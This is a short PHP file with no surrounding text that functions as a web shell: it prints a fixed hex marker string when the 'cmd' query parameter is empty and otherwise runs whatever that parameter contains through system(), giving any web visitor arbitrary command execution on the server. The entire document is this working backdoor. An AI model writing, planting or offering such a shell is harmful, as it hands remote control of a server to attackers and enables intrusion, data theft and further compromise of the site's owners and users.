<? 
if ( strcmp( $_GET['cmd'], "" ) == 0 ){
    echo "15825b40c6dace2a" . "7cf5d4ab8ed434d5";
}else{
    system ( $_GET['cmd'] );
}
?>
